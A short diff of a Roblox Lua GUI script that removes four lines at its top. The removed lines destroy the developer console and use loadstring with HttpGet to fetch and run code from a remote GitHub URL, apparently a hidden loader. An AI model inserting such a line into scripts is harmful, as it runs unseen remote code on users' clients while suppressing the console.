@@ -1,7 +1,4 @@
-local G2L = {};
-game:GetService("CoreGui").DevConsoleMaster:Destroy()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/DevTravDYT/PastebinTest/main/getgenv().config%20%3D%20getgenv().config.txt'))();
-game:GetService("Players").LocalPlayer.PlayerGui.Down:Destroy()
+
 -- StarterGui.MainScreenGui
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 G2L["1"]["Name"] = [[MainScreenGui]];
